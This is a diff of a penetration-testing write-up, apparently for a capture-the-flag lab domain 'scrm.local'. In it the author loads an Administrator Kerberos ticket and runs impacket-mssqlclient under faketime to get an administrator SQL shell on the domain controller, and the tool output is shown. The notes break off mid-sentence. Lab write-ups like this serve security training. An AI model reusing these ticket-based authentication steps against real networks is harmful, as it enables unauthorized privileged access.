@@ -329,5 +329,22 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 I now have an administrator ticket so i should be able to authenticate to mssql
 
 ```python
-
+export KRB5CCNAME=Administrator.ccache
 ```
+Ill export this
+
+```python
+faketime '17:49:16.173442' impacket-mssqlclient -k -no-pass dc1.scrm.local
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC1): Line 1: Changed database context to 'master'.
+[*] INFO(DC1): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+[!] Press help for extra shell commands
+SQL (SCRM\administrator  dbo@master)> 
+```
+I now have access to tge 
